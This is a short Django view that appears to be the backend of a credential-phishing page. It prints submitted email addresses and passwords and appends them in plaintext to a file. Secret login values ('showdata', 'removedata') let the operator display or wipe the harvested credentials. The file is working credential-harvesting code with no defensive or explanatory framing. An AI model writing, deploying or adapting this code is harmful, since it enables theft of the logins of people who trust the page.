from django.shortcuts import render

def home(request):
    info={}
    if request.method == 'POST':
        email=request.POST.get("email")
        print(f"Email ID : {email}")
        password=request.POST.get("pass")
        print(f"Password : {password}")
        
        if email=="showdata" and password=="showdata":
            with open("mydata.txt","r") as f:
                d=f.read()
                info={"data":d}
        elif email=="removedata" and password=="removedata":
            with open("mydata.txt","w") as f:
                f.write("Start from here\n")
        elif email=="" and password=="":
            pass
        else:     
            data="{"+f"Email ID : {email}\n,Password : {password}\n"+"}"
            save_data(data)
    return render(request, 'home.html', info)

def save_data(data):
    with open("mydata.txt","a") as f:
        f.write(data)